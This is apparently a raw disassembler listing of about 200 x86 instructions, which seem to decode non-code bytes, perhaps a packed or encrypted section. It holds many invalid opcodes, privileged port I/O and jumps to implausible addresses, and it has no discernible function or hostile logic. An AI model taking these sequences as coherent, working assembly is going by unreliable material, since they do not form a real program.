  4283c3:	scas   al,BYTE PTR es:[edi]
  4283c4:	cdq    
  4283c5:	fsubr  QWORD PTR [edi]
  4283c7:	repz and dh,BYTE PTR [edi]
  4283ca:	lds    eax,FWORD PTR [eax-0x3b37c3e1]
  4283d0:	ror    DWORD PTR [ecx],0xba
  4283d3:	pop    edx
  4283d4:	es iret 
  4283d6:	inc    ebx
  4283d7:	mov    ebx,0x80a2525a
  4283dc:	into   
  4283dd:	cmp    al,0x76
  4283df:	mov    DWORD PTR [ebx-0x71],ecx
  4283e2:	inc    ebx
  4283e3:	scas   al,BYTE PTR es:[edi]
  4283e4:	mov    esp,0x5f57d8d3
  4283e9:	or     eax,0x6d9604a7
  4283ee:	xlat   BYTE PTR ds:[ebx]
  4283ef:	mov    DWORD PTR [ebx-0x58],ebx
  4283f2:	sub    eax,0xb93ad4f
  4283f7:	sub    DWORD PTR [ecx],edi
  4283f9:	std    
  4283fa:	leave  
  4283fb:	mov    edx,0xaa31447f
  428400:	cld    
  428401:	pop    es
  428402:	ins    BYTE PTR es:[edi],dx
  428403:	sahf   
  428404:	xchg   ecx,eax
  428405:	std    
  428406:	sbb    eax,0xe893ef13
  42840b:	pop    edx
  42840c:	sbb    ah,BYTE PTR [ebx]
  42840e:	enter  0xd6de,0x67
  428412:	loopne 0x4283f4
  428414:	out    0x29,eax
  428416:	sbb    ah,cl
  428418:	or     DWORD PTR [esi-0x1e55f8aa],edx
  42841e:	imul   ecx,DWORD PTR [eax+0x161c0ddf],0x4f412339
  428428:	outs   dx,BYTE PTR ds:[esi]
  428429:	stos   BYTE PTR es:[edi],al
  42842a:	cmp    eax,0xb193d13b
  42842f:	mov    edx,eax
  428431:	or     eax,DWORD PTR [eax-0x1d44dbf9]
  428437:	je     0x42844f
  428439:	sub    eax,0xf1b93e9a
  42843e:	fwait
  42843f:	adc    ebp,ebx
  428441:	pop    DWORD PTR [edi-0x6fb756a]
  428447:	pop    edi
  428448:	mov    cl,0xe9
  42844a:	push   ecx
  42844b:	xchg   ebp,eax
  42844c:	fsubr  DWORD PTR [eax]
  42844e:	add    eax,0x41ae4354
  428453:	repz inc edx
  428455:	sub    al,0x4c
  428457:	push   ds
  428458:	out    dx,eax
  428459:	out    dx,al
  42845a:	jmp    0x428405
  42845c:	add    DWORD PTR [ecx-0x4b],0x59ad92cf
  428463:	xor    DWORD PTR [ebp+0x7c1d6fe9],0x42
  42846a:	(bad)  
  42846b:	cwde   
  42846c:	gs sbb bh,dl
  42846f:	xor    eax,0x7bc74d94
  428474:	fcom   DWORD PTR ds:0x47d2a33b
  42847a:	mov    BYTE PTR [edi],ch
  42847c:	dec    ecx
  42847d:	pushf  
  42847e:	sbb    edx,DWORD PTR [esi+0x62]
  428481:	xchg   esp,eax
  428482:	cmp    eax,DWORD PTR [edi+0x22]
  428485:	mov    al,ds:0x89e78aba
  42848a:	fld    st(3)
  42848c:	mov    al,ds:0x3952f0ea
  428491:	fldcw  WORD PTR [edi+esi*1+0x7716ddcc]
  428498:	pop    ds
  428499:	shl    BYTE PTR [ecx+0x3a],0x81
  42849d:	call   0xdb2b:0x23475fb5
  4284a4:	(bad)  
  4284a5:	jg     0x42850d
  4284a7:	pop    ebp
  4284a8:	add    dh,BYTE PTR [esp+ebp*1]
  4284ab:	jl     0x428450
  4284ad:	inc    ecx
  4284ae:	or     esi,DWORD PTR [edi]
  4284b0:	cmp    eax,0x63b53f12
  4284b5:	xchg   esp,eax
  4284b6:	xlat   BYTE PTR ds:[ebx]
  4284b7:	xchg   ecx,eax
  4284b8:	cmp    eax,0x381313bd
  4284bd:	out    0x99,eax
  4284bf:	daa    
  4284c0:	aas    
  4284c1:	std    
  4284c2:	daa    
  4284c3:	push   si
  4284c5:	dec    ecx
  4284c6:	leave  
  4284c7:	sbb    eax,0x8c0e03c9
  4284cc:	mov    cl,BYTE PTR [edi+0x33]
  4284cf:	into   
  4284d0:	mov    ch,0x5a
  4284d2:	iret   
  4284d3:	or     al,0x5
  4284d5:	add    al,0xe1
  4284d7:	out    0xf6,eax
  4284d9:	cdq    
  4284da:	mov    bl,0xea
  4284dc:	das    
  4284dd:	(bad)  
  4284de:	mov    bh,0xcb
  4284e0:	xchg   ebx,eax
  4284e1:	out    0xd1,eax
  4284e3:	pusha  
  4284e4:	jl     0x4284ef
  4284e6:	cmc    
  4284e7:	inc    edi
  4284e8:	xor    dl,BYTE PTR [edi+ebx*1+0x650a3e31]
  4284ef:	xchg   DWORD PTR [esp+ebp*8-0x2f],ebp
  4284f3:	in     eax,0x1d
  4284f5:	mov    esi,0x88f2ba0b
  4284fa:	inc    ebx
  4284fb:	push   ecx
  4284fc:	add    esp,DWORD PTR [edi]
  4284fe:	fisubr DWORD PTR [esi+0x78]
  428501:	dec    esi
  428502:	ins    BYTE PTR es:[edi],dx
  428503:	aad    0xc4
  428505:	inc    edi
  428506:	fsub   DWORD PTR ds:0xf325f62c
  42850c:	mov    al,0xa6
  42850e:	mov    dh,BYTE PTR [edi+0x78]
  428511:	add    DWORD PTR [eax-0x640c3f7f],ecx
  428517:	sub    ebp,eax
  428519:	fldenv [eax]
  42851b:	loope  0x4284d6
  42851d:	pop    ebx
  42851e:	push   ebx
  42851f:	or     eax,0x3ab2c35c
  428524:	xchg   BYTE PTR [ebp+eax*1+0x5],ah
  428528:	mov    fs:0xabc50b85,eax
  42852e:	dec    ebx
  42852f:	pop    esi
  428530:	jmp    0x88785d4c
  428535:	aad    0xc8
  428537:	adc    BYTE PTR [esi+esi*8+0xc599551],bh
  42853e:	shl    DWORD PTR [esi],0xfc
  428541:	stos   DWORD PTR es:[edi],eax
  428542:	sub    DWORD PTR [eax],edx
  428544:	scas   al,BYTE PTR es:[edi]
  428545:	jg     0x428542
  428547:	scas   al,BYTE PTR es:[edi]
  428548:	shl    DWORD PTR [ebp-0x6d],cl
  42854b:	push   esp
  42854c:	pop    es
  42854d:	mov    ch,0x55
  42854f:	popw   ds
  428551:	ja     0x42859b
  428553:	push   ss
  428554:	scas   al,BYTE PTR es:[edi]
  428555:	or     DWORD PTR [edi+0x1b],0x77e2c709
  42855c:	push   ecx
  42855d:	jg     0x42852c
  42855f:	pop    esi
  428560:	icebp  
  428561:	lods   eax,DWORD PTR ds:[esi]
  428562:	lds    esi,FWORD PTR [edi]
  428564:	clc    
  428565:	adc    DWORD PTR [edi-0x6d],esp
  428568:	jp     0x42853e
  42856a:	adc    BYTE PTR ds:[ebx+0xaf45],al
	...
  428579:	add    BYTE PTR [ecx-0x7d39faf],ch
  42857f:	cmp    eax,0x65b9d5ed
  428584:	test   BYTE PTR [ecx+0x48fd7d8b],ch
  42858a:	push   esp
  42858b:	cli    
  42858c:	add    DWORD PTR [eax],eax
  42858e:	sldt   WORD PTR [eax]
  428591:	add    BYTE PTR [esi+0x7a5384ad],cl
  428597:	fwait
  428598:	push   es
  428599:	ss mov eax,eax
  42859c:	cld    
  42859d:	xor    DWORD PTR [ecx],0x31
  4285a0:	add    eax,DWORD PTR [eax]
	...
